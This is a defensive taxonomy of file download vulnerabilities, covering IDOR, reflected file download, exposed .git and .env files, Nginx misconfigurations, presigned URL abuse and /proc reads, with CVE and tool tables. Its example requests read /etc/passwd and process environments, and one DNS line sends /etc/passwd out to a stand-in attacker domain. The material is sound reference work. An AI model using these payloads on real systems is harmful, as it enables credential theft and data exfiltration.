# File Download Vulnerability Mutation/Variation Taxonomy

**Version**: 2025
**Scope**: Arbitrary File Download, Forced File Download, and File Access Control Bypass — excluding Path Traversal encoding/normalization (→ `path-traversal.md`), SSRF-based file:// access (→ `ssrf.md`), XXE-based file read (→ `xxe.md`), Archive extraction traversal (→ `file-upload.md`, `zip-archive.md`), and Document processing library exploits (→ `document-media-processing-library-rce.md`).

---

## Classification Structure

File download vulnerabilities arise when an application exposes a mechanism for retrieving files — whether through dedicated download endpoints, static file serving, cloud storage delegation, or infrastructure misconfiguration — and an attacker subverts this mechanism to access unauthorized resources. Unlike path traversal (which focuses on *encoding-level* bypass of path filters), this taxonomy addresses the *architectural and logical* attack surface of file delivery systems.

**Axis 1 (Primary): Mutation Target** — the structural component of the file delivery system being exploited: download endpoint logic, access control binding, response header semantics, infrastructure file serving, cloud storage delegation, filesystem metadata, process/memory virtual files, and temporal state.

**Axis 2 (Cross-Cutting): Exploitation Primitive** — the fundamental technique leveraged across categories.

| Exploitation Primitive | Mechanism |
|----------------------|-----------|
| **Identifier Manipulation** | Tampering with file IDs, paths, names, or references to access unauthorized objects |
| **Access Control Gap** | Exploiting missing, inconsistent, or bypassable authorization on file retrieval |
| **Response Semantics Abuse** | Manipulating HTTP response headers to alter download behavior or content interpretation |
| **Infrastructure Mismatch** | Exploiting discrepancies between proxy, CDN, server, and application file-serving logic |
| **Delegation Weakness** | Abusing token, signature, or policy flaws in cloud/external storage delegation |
| **Temporal Race** | Exploiting time-of-check-to-time-of-use gaps in file operations |
| **Information Leakage** | Accessing exposed artifacts (backups, configs, VCS) through predictable or discoverable paths |

**Axis 3 (Deployment): Attack Scenario** — the architectural context determining impact (§9).

---

## §1. Download Endpoint Parameter Manipulation

Download endpoints typically accept parameters that identify the target file — by name, path, ID, or token. When parameter validation is absent or insufficient, attackers manipulate these references to retrieve arbitrary files.

> **Scope boundary**: This section covers *logical* parameter manipulation at the application layer. For encoding-layer bypasses (`../`, `%2e%2e`, Unicode normalization), see `path-traversal.md`.

### §1-1. File Path Parameters

Many download endpoints accept a direct file path or filename as a query/POST parameter. Without validation, the application becomes a generic file-retrieval proxy.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Direct Path Injection** | User-controlled `file=` parameter passed directly to filesystem read | `GET /download?file=/etc/passwd` | No path restriction or chroot |
| **Absolute Path Override** | Application prepends a base directory, but absolute path escapes it | `GET /download?file=C:\Windows\win.ini` | Path concatenation without canonicalization check |
| **Null Byte Truncation** | Null byte terminates string processing, discarding appended extension | `GET /download?file=../../../etc/passwd%00.pdf` | Language/runtime uses C-style string termination (legacy PHP < 5.3.4, older Java) |
| **Parameter Pollution** | Multiple `file=` parameters with different values; backend uses different one than validator | `GET /download?file=safe.pdf&file=../../etc/shadow` | HPP: validator checks first, backend reads last |
| **Concatenation Injection** | Application concatenates user input into path template with injectable separators | `GET /api/files/{category}/{name}` → `category=../../etc&name=passwd` | Multi-parameter path construction |

### §1-2. File Identifier References (IDOR)

Applications often reference files by numeric ID, UUID, hash, or database key. Insecure Direct Object Reference (IDOR) occurs when authorization is not validated against the requesting user's permissions.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Sequential ID Enumeration** | Incrementing/decrementing integer file IDs to access other users' files | `GET /download?id=1001` → `id=1002, 1003...` | Auto-increment IDs without ownership check |
| **UUID Leakage + Replay** | UUIDs are non-guessable but leaked in other responses (API, HTML source, logs) | Enumerate UUIDs from `/api/files/list` then access `/download?uuid={leaked}` | UUID disclosed in another endpoint without scoping to user |
| **Encoded/Hashed ID Reversal** | Base64, hex, or weak hash used as file identifier; attacker decodes or brute-forces | `GET /download?ref=dXNlcjEvcmVjZWlwdC5wZGY=` (base64 of `user1/receipt.pdf`) | Predictable encoding without HMAC/signature |
| **Bulk Export Abuse** | Export/archive endpoint packages files without per-file ACL checks | `POST /export?ids=[101,102,999]` | Batch operation skips individual authorization |
| **Cross-Tenant File Access** | Multi-tenant system where file references don't bind to tenant context | `GET /download?file_id=5001` (belongs to tenant B) from tenant A's session | Tenant isolation only at UI level, not API level |

### §1-3. Indirect File Reference Manipulation

Some applications use indirect references (mappings, database lookups, or registry keys) that can be subverted.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Database Record Tampering** | File metadata in DB includes path; attacker modifies via SQL injection or mass assignment | Update `file_path` column via IDOR on metadata endpoint | Mutable file metadata without integrity check |
| **Symbolic Reference Swap** | Application uses logical names mapped to physical files; attacker modifies mapping | Change `template=invoice` to `template=../../etc/passwd` in config | Template/config lookup without path validation |
| **Content-Type Routing Abuse** | Application serves different files based on Accept header or format parameter | `GET /report/123.csv` vs `/report/123.json` — one route has weaker ACL | Inconsistent authorization across format handlers |

---

## §2. Reflected File Download (RFD)

Reflected File Download tricks a user's browser into downloading a malicious file that appears to originate from a trusted domain. Unlike traditional file download vulnerabilities (server reads attacker-chosen file), RFD makes the *victim's browser* save attacker-controlled content as an executable file.

### §2-1. Content-Disposition Filename Injection

The attack requires controlling the filename in the `Content-Disposition: attachment; filename=` header, combined with reflected content in the response body.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **URL Path Extension Injection** | API reflects input in JSON/JSONP response; URL path controls downloaded filename | `GET /api/search;setup.bat?q=malicious_commands` | Server ignores path suffix but browser uses it as filename |
| **Filename Attribute Injection** | Inject into Content-Disposition filename via unsanitized input | `filename="payload.bat"; filename*=utf-8''payload.bat` | Application derives filename from user input without quote escaping |
| **Non-ASCII Charset Bypass** | Use non-ASCII charset in Content-Disposition to bypass sanitization | CVE-2025-41234: Spring Framework RFD via `ContentDisposition` with non-ASCII charset | Framework doesn't sanitize filename when using extended charset |
| **JSONP Callback RFD** | JSONP endpoint reflects callback parameter in response; attacker crafts executable content | `GET /api/data?callback=malicious_bat_content//` → saved as `.bat` | JSONP callback without strict alphanumeric validation |
| **Header CRLF Injection** | Inject CRLF to create new Content-Disposition header overriding the original | `%0d%0aContent-Disposition: attachment; filename=evil.bat` | Response header injection vulnerability |

### §2-2. Content-Type / Extension Mismatch

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Missing X-Content-Type-Options** | Browser sniffs content as executable despite safe Content-Type | JSON response sniffed as HTML when saved with `.html` extension | No `X-Content-Type-Options: nosniff` header |
| **Double Extension Bypass** | Browser/OS uses last extension for execution but first for display | `report.txt.bat` displayed as "text file" but executed as batch | Windows hides known extensions by default |

---

## §3. Infrastructure-Level File Exposure

Server and proxy misconfigurations expose files that should never be served. These are not application logic flaws but infrastructure-layer issues.

### §3-1. Version Control and Development Artifacts

Deployed applications frequently include development artifacts that expose source code, credentials, and configuration.

| Subtype | Mechanism | Target Files | Key Condition |
|---------|-----------|-------------|---------------|
| **Exposed .git Directory** | Git metadata and objects accessible via HTTP, enabling full repository reconstruction | `/.git/HEAD`, `/.git/config`, `/.git/objects/` | `.git/` directory deployed to web root; no server-level deny rule |
| **Exposed .svn Directory** | SVN metadata reveals source code and version history | `/.svn/entries`, `/.svn/wc.db` | `.svn/` directory deployed to web root |
| **Exposed .hg Directory** | Mercurial metadata accessible via HTTP | `/.hg/store/`, `/.hg/dirstate` | `.hg/` directory deployed to web root |
| **.env File Disclosure** | Environment configuration file with secrets served as static content | `/.env`, `/.env.production`, `/.env.local` | dotenv files in web root without deny rule |
| **IDE/Editor Artifacts** | IDE workspace and project files reveal structure and credentials | `/.idea/workspace.xml`, `/.vscode/settings.json`, `.DS_Store` | Development artifacts deployed without cleanup |
| **Package Manager Lockfiles** | Dependency metadata reveals framework versions and potential vulnerabilities | `/package.json`, `/composer.json`, `/Gemfile.lock`, `/requirements.txt` | Package metadata served as static files |

**Reconstruction Technique**: With access to `.git/` objects, tools like `git-dumper` or `GitTools` can reconstruct the complete repository including commit history, branches, and secrets ever committed (even if later deleted).

### §3-2. Backup and Temporary File Disclosure

Web servers may serve backup copies created by editors, administrators, or automated processes.

| Subtype | Mechanism | Example Paths | Key Condition |
|---------|-----------|--------------|---------------|
| **Editor Backup Files** | Text editors create backup copies with predictable extensions | `config.php~`, `config.php.bak`, `config.php.swp`, `.config.php.swn`, `#config.php#` | Vim/Emacs/nano swap/backup files left in production |
| **Administrator Backups** | Manual or scripted backup copies with common naming patterns | `backup.sql`, `db_dump.sql`, `site_backup.tar.gz`, `www.zip` | Backup files stored in web-accessible directory |
| **Predictable Backup Naming** | Automated backup systems use timestamp or sequential naming | `backup_2024-01-15.sql`, `db_backup_daily.tar.gz` | Predictable naming enables targeted discovery |
| **Temporary Upload Artifacts** | Upload processing creates temp files that persist | `/tmp/phpXXXXXX`, `/upload/temp/chunk_001` | Temp cleanup not implemented or failed |
| **CMS/Framework Default Backups** | Framework-specific backup locations and naming | WordPress: `/wp-content/debug.log`; Rails: `config/database.yml` | Framework defaults not secured for production |

**CVE-2024-53991** (Discourse): Predictable backup file naming combined with Nginx `send_file` behavior allowed unauthenticated access to database backup files via crafted requests to the `StylesheetsController`, which bypassed authentication checks.

### §3-3. Reverse Proxy / Web Server Misconfiguration

Mismatches between proxy routing rules and backend file serving create unauthorized access paths.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Nginx Alias Off-by-Slash** | Missing trailing slash in `location` + `alias` directive allows path escape | `location /static { alias /var/www/static; }` → `GET /static../etc/passwd` resolves to `/var/www/etc/passwd` | `location` without trailing slash + `alias` with directory path |
| **Proxy Path Normalization Gap** | Proxy normalizes path differently than backend | Proxy strips `//` → backend receives `/../`, or proxy decodes `%2f` → backend sees literal `/` | Proxy and backend use different URL parsers |
| **ACL Bypass via Method Override** | `GET` blocked but `HEAD` or custom methods allowed; response includes body or triggers same handler | `HEAD /admin/config.json` returns 200 with full body | Method-specific ACL but handler serves content for all methods |
| **Host Header Routing Bypass** | Virtual host routing serves wrong site's files when Host header is manipulated | `Host: internal-app.local` on public-facing proxy | Default vhost serves internal application files |
| **Server Status/Info Pages** | Debug endpoints expose file listings and configuration | `/server-status`, `/server-info`, `/_debug/`, `/actuator/env` | Debug endpoints enabled in production |

### §3-4. CDN Path Confusion and Cache-Based Exposure

CDNs cache responses based on URL patterns. Path confusion between the CDN and origin can expose sensitive files.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Path Delimiter Confusion** | CDN and origin disagree on what constitutes a path segment | `/user/profile%23.css` — CDN caches as CSS, origin serves profile data | CDN uses different delimiter set than origin |
| **Extension-Based Cache Rule Exploitation** | CDN caches responses matching static file extensions regardless of actual content | `/api/user/settings/avatar.css` — CDN caches, serves API response to others | CDN rule: cache `*.css`, origin ignores extension |
| **Normalization-Dependent Caching** | CDN normalizes URL before cache key, origin doesn't (or vice versa) | `/static/../secret/config.json` — CDN normalizes, sends `/secret/config.json` | CDN resolves traversal sequences before forwarding |

---

## §4. Cloud Storage Delegation Attacks

Modern applications delegate file storage to cloud services (AWS S3, GCS, Azure Blob). The delegation mechanism — typically pre-signed/shared access URLs — introduces unique attack surfaces distinct from direct filesystem access.

### §4-1. Pre-Signed URL Path Injection

Pre-signed URLs grant time-limited access to specific cloud objects. When the application generates these URLs from user-controlled input, attackers can manipulate the target object.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Object Key Manipulation** | Attacker modifies the object key parameter to reference unauthorized files | `POST /get-download-url` with `key=pdfs/124/receipt.pdf` → change to `key=pdfs/999/receipt.pdf` | Application doesn't validate object key against user's permissions |
| **Bucket Listing via Empty Key** | Setting object key to `/` or empty generates a URL that lists bucket contents | `POST /get-download-url` with `key=/` | Signer has `s3:ListBucket` permission; no key validation |
| **Cross-Bucket Reference** | Manipulate bucket name parameter to access different bucket | `bucket=private-backups&key=database.sql` | Application accepts user-controlled bucket parameter |
| **Path Traversal in Object Key** | Cloud-agnostic traversal through key manipulation | `key=public/../../private/secrets.json` | Key parameter not canonicalized before signing |

### §4-2. Pre-Signed URL Lifecycle Abuse

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **URL Sharing / Leakage** | Pre-signed URLs leaked via Referer header, browser history, logs, or shared links | URL with `X-Amz-Credential` leaks to third-party analytics | URLs contain credentials and are not treated as secrets |
| **Extended Persistence** | Pre-signed URLs remain valid after user deprovisioning or permission revocation | User terminated, but pre-signed URLs generated before termination still work for 6+ hours | URL validity tied to signing credential lifetime, not user session |
| **Signature Replay** | Valid signature extracted from one pre-signed URL replayed for different objects | Replay AWS SigV4 components from a legitimate URL to forge access to other keys | Signature doesn't bind to specific object path (misconfigured policy) |
| **Unlogged Generation** | URL generation produces no audit trail; only URL *usage* is logged | Pre-signed URLs created by compromised EC2 instance; no creation event in CloudTrail | AWS does not log presigned URL creation, only access |

### §4-3. Bucket Policy and ACL Misconfiguration

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Public Bucket Listing** | Bucket configured with `s3:ListBucket` for `AllUsers` or `AuthenticatedUsers` | `https://s3.amazonaws.com/company-data/` returns XML object listing | Misconfigured bucket ACL |
| **SAS Token Over-Permission** | Azure Shared Access Signature grants broader access than intended | SAS token with `srt=sco` (service + container + object) when only object-level needed | Overly broad SAS token permissions |
| **Expired Credential Caching** | CDN or application caches pre-signed URL past credential rotation | Cached URL continues to work with old credential due to CDN caching | CDN TTL exceeds pre-signed URL expiry |

---

## §5. Process and Virtual Filesystem Exploitation

Linux exposes process state through virtual filesystems (`/proc`, `/sys`, `/dev`). When a file download primitive exists (even limited to a specific directory), accessing these virtual files can escalate impact dramatically.

### §5-1. /proc/self Exploitation

The `/proc/self/` directory is a symbolic link to the current process's `/proc/[PID]/` directory, providing access to the web server process's internal state.

| Subtype | Mechanism | Target | Impact |
|---------|-----------|--------|--------|
| **Environment Variable Disclosure** | Read process environment containing secrets | `/proc/self/environ` | Database credentials, API keys, session secrets |
| **File Descriptor Enumeration** | Iterate `/proc/self/fd/N` to access all open file handles | `/proc/self/fd/0` through `/proc/self/fd/N` | Access to log files, sockets, temp files, database connections |
| **Command Line Disclosure** | Read process startup arguments | `/proc/self/cmdline` | Runtime flags, config file paths, secrets passed as arguments |
| **Memory Map Disclosure** | Read process memory layout for ASLR bypass | `/proc/self/maps` | Memory addresses for exploit development |
| **CWD / Root Discovery** | Resolve current working directory and root via symlinks | `/proc/self/cwd/`, `/proc/self/root/` | Discover application installation path |
| **Auxiliary Vector Disclosure** | Read ELF auxiliary vector for platform information | `/proc/self/auxv` | Architecture, page size, kernel entry point |

### §5-2. Cross-Process Access

When the web server process has sufficient permissions, reading other processes' state is possible.

| Subtype | Mechanism | Target | Impact |
|---------|-----------|--------|--------|
| **PID Enumeration** | Iterate `/proc/[PID]/` for all running processes | `/proc/1/environ`, `/proc/[sshd_pid]/` | Secrets from other services (database, cache, queue) |
| **Container Escape Indicators** | Read container metadata from proc filesystem | `/proc/1/cgroup`, `/proc/self/mountinfo` | Container orchestration details, potential escape vectors |
| **Kernel Information** | Read kernel version and configuration | `/proc/version`, `/proc/config.gz` | Kernel version for privilege escalation research |

### §5-3. Device and System Virtual Files

| Subtype | Mechanism | Target | Impact |
|---------|-----------|--------|--------|
| **Pseudo-Random State** | Read kernel RNG state | `/dev/urandom` (not useful), `/proc/sys/kernel/random/entropy_avail` | Assess randomness quality for crypto attacks |
| **Mounted Filesystem Discovery** | List all mounted filesystems and their types | `/proc/mounts`, `/etc/fstab` | Discover additional storage, NFS mounts, tmpfs locations |
| **Network Configuration** | Read active network configuration and connections | `/proc/net/tcp`, `/proc/net/udp`, `/proc/net/arp` | Internal network mapping, service discovery |

---

## §6. Temporal and Race Condition Exploitation

File download operations involving multiple steps (check → read → serve) create race windows exploitable through timing manipulation.

### §6-1. TOCTOU in File Access

Time-of-Check-to-Time-of-Use vulnerabilities occur when the file's identity or attributes change between validation and read.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Symlink Race** | Replace legitimate file with symlink to sensitive file between check and read | Application validates `/uploads/user/file.txt` exists → attacker replaces with symlink to `/etc/passwd` → application reads target | File check and file read in separate syscalls; attacker has write access to directory |
| **File Swap Race** | Rename/move a different file into the expected path between check and read | Swap benign file with sensitive file during the race window | Attacker controls file in same filesystem; non-atomic check-and-read |
| **Directory Traversal via Late Binding** | Modify path component (directory symlink) after path validation | Create symlink: `/uploads/user_dir → /etc/` after path check | Directory components resolved at read time, not check time |

### §6-2. Concurrent Download Exploitation

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Permission Window Race** | Access file during brief window when permissions are relaxed | File temporarily readable during backup/migration process | Automated processes change file permissions cyclically |
| **Partial Content Race** | Request file via Range headers during write operation to get mixed content | `Range: bytes=0-1024` on a file being actively written | Application doesn't lock files during write operations |
| **Temp File Race** | Access temporary file before it's moved to secure location or deleted | Read `/tmp/upload_XXXXXX` before application moves to permanent storage | Predictable temp file naming; no exclusive file lock |

---

## §7. Response Header and Content Manipulation

HTTP response headers control how browsers handle downloaded content. Manipulating these headers (or exploiting their absence) creates attack vectors beyond simple file retrieval.

### §7-1. Content-Disposition Attacks

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Filename Override** | Inject filename into Content-Disposition to control saved filename | Response: `Content-Disposition: attachment; filename="report.exe"` | Application uses unsanitized user input for filename |
| **Inline-to-Attachment Switch** | Force download of content normally rendered inline | Append `?download=true` or manipulate Accept header to trigger attachment disposition | Application toggles between inline and attachment based on parameter |
| **Extension Injection** | Control file extension in Content-Disposition filename | Inject `.exe`, `.bat`, `.cmd`, `.ps1` extension into downloaded filename | Filename derived from user-controlled input without extension whitelist |

### §7-2. Range Header Exploitation

HTTP Range headers enable partial content retrieval, which can be abused in specific scenarios.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Byte-at-a-Time Extraction** | Request one byte at a time to bypass content inspection | `Range: bytes=0-0`, `Range: bytes=1-1`, ... reassembled client-side | DLP/content filter only inspects complete responses |
| **Range-Based XSS Isolation** | Isolate reflected XSS payload using Range header to strip surrounding safe content | `Range: bytes=1337-1400` returns only the reflected script tag | Server supports Range on dynamic content; no `X-Content-Type-Options` |
| **Multi-Range Information Disclosure** | Multipart range response reveals internal boundaries and content structure | `Range: bytes=0-10, 1000-1010` returns `multipart/byteranges` with boundary metadata | Server processes arbitrary Range combinations |

---

## §8. WebSocket and Alternative Channel Exfiltration

File access through non-HTTP channels can bypass traditional web security controls.

### §8-1. WebSocket File Access

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **Cross-Site WebSocket Hijacking (CSWSH)** | Attacker's page establishes WebSocket to target; reads file data from streamed responses | Victim visits attacker page → WS connects to `wss://target/ws` → exfiltrates file data | WebSocket endpoint accepts any Origin; authentication via cookies only |
| **WebSocket Smuggling** | Exploit WebSocket upgrade handshake mismatch to smuggle HTTP requests accessing files | Front-end proxy upgrades to WS; attacker sends raw HTTP via WS tunnel to access internal file endpoints | Proxy and backend disagree on WebSocket upgrade completion |
| **Unauthenticated WS File Access** | WebSocket server exposes file read capabilities without authentication | Connect to `ws://localhost:PORT` → send `{"cmd": "readFile", "path": "/etc/passwd"}` | WS server binds to localhost but no auth (CVE-2025-52882 pattern) |

### §8-2. DNS-Based File Exfiltration

When direct HTTP response is not available (blind file read), DNS can be used as an out-of-band channel.

| Subtype | Mechanism | Example | Key Condition |
|---------|-----------|---------|---------------|
| **DNS Rebinding for Local File Access** | DNS rebinding bypasses SOP; attacker script reads local files after rebinding | DNS resolves to attacker IP → loads JS → DNS rebinds to `127.0.0.1` → script reads local file endpoint | Target service on localhost serves files; no CORS/SOP-aware authentication |
| **OOB Data via DNS Queries** | Encode file contents as DNS subdomain labels | `$(cat /etc/passwd | base64 | head -c 60).attacker.com` | Blind file read primitive + DNS resolution from target |

---

## §9. Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Precondition | Primary Mutation Categories | Impact |
|----------|---------------------------|---------------------------|--------|
| **Credential Harvesting** | File download primitive + known config locations | §1 + §5 (`/proc/self/environ`, `.env`, `config.yml`) | Database credentials, API keys, session secrets |
| **Source Code Theft** | Exposed VCS or backup + web-accessible storage | §3-1 + §3-2 (`.git`, backup files) | Full application source, hardcoded secrets, business logic |
| **Cross-Tenant Data Access** | Multi-tenant SaaS with shared storage backend | §1-2 + §4-1 (IDOR + presigned URL manipulation) | Access to other tenants' documents, PII, financial data |
| **Lateral Movement** | File read escalated to credential theft + internal access | §5-1 (proc environ) → SSH keys, DB creds → internal systems | Network-wide compromise from single file read |
| **RCE via File Read** | File download primitive + writable location or config injection | §5-1 (`/proc/self/fd`) + log poisoning, or backup config overwrite | Remote code execution from file download |
| **Supply Chain Exposure** | Exposed dependency files + VCS metadata | §3-1 + §3-2 (`package.json`, `.git`, `composer.lock`) | Identify vulnerable dependencies for targeted exploitation |
| **Persistent Cloud Access** | Pre-signed URL leakage + no rotation policy | §4-2 (lifecycle abuse) | Persistent unauthorized access surviving credential rotation |
| **Social Engineering via RFD** | Trusted domain + reflectable content | §2 (Reflected File Download) | Malware distribution appearing to originate from trusted domain |

---

## §10. CVE / Bounty Mapping (2024–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §1-1 (Direct Path) | CVE-2024-24919 (Check Point VPN Gateway) | CVSS 8.6. Zero-day arbitrary file read via crafted POST to `/clients/MyCRL`; actively exploited in the wild. CISA KEV listed. |
| §1-1 (CLI Parameter) | CVE-2024-23897 (Jenkins args4j) | CVSS 9.8. `@` prefix in CLI arguments triggers file content expansion; unauthenticated users read first lines, authenticated users read entire files. |
| §2-1 (RFD + Content-Disposition) | CVE-2025-41234 (Spring Framework) | Medium severity. RFD via non-ASCII charset in `ContentDisposition`; affects 6.0.5–6.2.7. Malicious `.bat`/`.cmd` download from trusted domain. |
| §3-2 (Backup Disclosure) | CVE-2024-53991 (Discourse) | CVSS 7.5. Backup file disclosure via `send_file` quirk + Nginx configuration; unauthenticated access to database backups. |
| §3-3 (Off-by-Slash) | Multiple Nginx deployments | Widespread. Missing trailing slash in `location`+`alias` enables path escape. Source code disclosure across Django, Rails, and PHP applications. |
| §4-1 (Presigned URL Path) | Multiple S3 bug bounty reports | $500–$10,000. Path manipulation in presigned URL generation exposing cross-user files and bucket listings. |
| §4-2 (Signature Replay) | CVE-2025-65073 (OpenStack Keystone) | High. EC2/S3 token endpoint authorization bypass; presigned URL signature replayed to obtain fully-scoped tokens. |
| §1-2 (IDOR File Download) | HackerOne Top IDOR reports | $1,000–$12,500. Sequential file ID enumeration across SaaS platforms exposing invoices, documents, and PII. |
| §8-1 (WebSocket File Access) | CVE-2025-52882 (Claude Code MCP) | CVSS 8.8. Unauthenticated WebSocket connection to IDE MCP server enables local file read and code execution. |
| §5-1 (Proc Environ) | Multiple bug bounty reports | $500–$5,000. LFI-to-proc/self/environ chains leaking AWS keys, database passwords, session secrets. |
| §1-1 (Path Injection) | CVE-2024-43660 (IoCharger firmware) | CGI script enables download of any filesystem file via path parameter manipulation. |

---

## §11. Detection Tools

| Tool | Target Scope | Core Technique |
|------|-------------|---------------|
| **git-dumper** / **GitTools** | §3-1 Exposed .git | Reconstruct git repositories from exposed `.git/` directory via HTTP |
| **svn-extractor** | §3-1 Exposed .svn | Extract source code from exposed `.svn/wc.db` and entries |
| **DotGit** (Burp Extension) | §3-1 VCS Disclosure | Passively detect exposed VCS directories during Burp scanning |
| **feroxbuster** / **ffuf** / **dirsearch** | §3-1, §3-2 File Discovery | Brute-force discovery of backup files, config files, and hidden directories |
| **nuclei** (ProjectDiscovery) | §3, §1, §4 Multi-target | YAML-template scanner with 11,000+ templates including file disclosure, backup detection, cloud misconfig |
| **off-by-slash** (Burp Extension) | §3-3 Nginx Alias | Detect Nginx alias off-by-slash misconfigurations at scale |
| **S3Scanner** | §4-3 Bucket Misconfig | Enumerate and test S3 bucket permissions and ACLs |
| **CloudBrute** | §4 Cloud Storage | Multi-cloud (AWS/GCS/Azure) bucket and blob enumeration |
| **Autorize** (Burp Extension) | §1-2 IDOR | Automatically test authorization enforcement on file download endpoints |
| **truffleHog** / **gitleaks** | §3-1 Secret Detection | Scan exposed repositories and files for hardcoded credentials |
| **Singularity** (NCC Group) | §8-2 DNS Rebinding | DNS rebinding attack framework for testing local file access via rebinding |
| **OWASP ZAP** | §1, §3, §7 Multi-target | Active scanner with file download and backup file detection rules |

---

## Summary: Core Principles

The fundamental property enabling file download vulnerabilities is the **mismatch between the file delivery system's trust model and actual access boundaries**. Applications must serve files to authorized users, which requires binding every file reference to a verified identity and permission scope. When this binding is absent, weak, or inconsistent across layers (application, infrastructure, cloud delegation), attackers gain unauthorized file access.

Incremental fixes fail because file download systems involve **multiple architectural layers** that each independently make access decisions: the application validates parameters, the web server resolves file paths, the CDN caches responses, and the cloud storage enforces bucket policies. A fix at one layer often leaves gaps at another. For instance, securing the application-layer file parameter doesn't prevent Nginx alias misconfiguration from exposing the same files, and rotating application credentials doesn't invalidate pre-signed URLs generated with long-lived cloud IAM roles.

A structural solution requires **defense in depth across all layers**: application-level authorization bound to every file reference (not just the UI), infrastructure-level deny rules for sensitive file patterns (`.git`, `.env`, backup extensions), cloud-level least-privilege signing with short TTLs and audit logging, and response-level headers (`X-Content-Type-Options`, `Content-Disposition` sanitization) that prevent client-side exploitation. The file delivery system should treat the filename, path, and identifier as **untrusted input at every layer**, applying the principle of least privilege not just to who can download, but to what each layer can serve.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

## References

- OWASP Web Security Testing Guide v4.2: Test for File Download (OTG-BUSLOGIC)
- CWE-552: Files or Directories Accessible to External Parties
- CWE-73: External Control of File Name or Path
- CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory
- CWE-530: Exposure of Backup File to an Unauthorized Control Sphere
- CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere
- CWE-377: Insecure Temporary File
- PortSwigger Research: Top 10 Web Hacking Techniques 2024/2025
- Detectify Labs: Bypassing and Exploiting Bucket Upload Policies and Signed URLs
- WithSecure Labs: Pre-signed at Your Service
- iVision Research: Signed, Sealed, Delivered… Secure?
- ProjectDiscovery Blog: CVE-2024-53991 Discourse Backup Disclosure
- Trend Micro: CVE-2024-23897 Jenkins Args4j Analysis
- Datadog Security Labs: CVE-2025-52882 WebSocket Authentication Bypass
